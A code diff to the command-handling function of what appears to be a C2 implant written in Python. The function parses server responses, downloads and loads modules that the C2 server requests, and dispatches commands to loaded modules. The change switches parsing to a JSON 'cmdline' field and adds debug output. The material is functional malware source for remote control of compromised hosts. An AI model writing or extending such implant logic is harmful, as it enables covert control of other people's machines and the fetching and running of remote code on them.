@@ -61,10 +61,10 @@ def process_response(post_object):
     """This function takes the response from the server and processes it"""
     # if post_object != '""':
     res_obj = json.loads(post_object)
-    if len(post_object.split()) == 2 and post_object.split()[0] == 'load':
+    if len(res_obj) == 2 and res_obj['cmdline'].split()[0] == 'load':
         # C2 is asking to load a module, so we will check if the module is
         # on disk or not, if not then we will download it from the server
-        module_name = post_object.split()[1]
+        module_name = res_obj['cmdline'].split()[1]
         path_to_zip_file = "{}\\{}.zip".format(DISK_PATH, module_name)
         if module_name in [dI for dI in os.listdir(DISK_PATH) if
                            os.path.isdir(
@@ -87,8 +87,10 @@ def process_response(post_object):
                           '{} module loaded and ready to be used'.format(
                               module_name))
     # running specific modules
-    elif post_object.split()[0] in get_loaded_modules():
-        pass
+    elif len(res_obj) > 1 and res_obj['cmdline'].split()[0] in get_loaded_modules():
+        print('You ran a module')
+        print(res_obj['cmdline'])
+        print('=======')
     else:
         # If a command is received
         if len(post_object) != 2:  # means that there is a cmdline
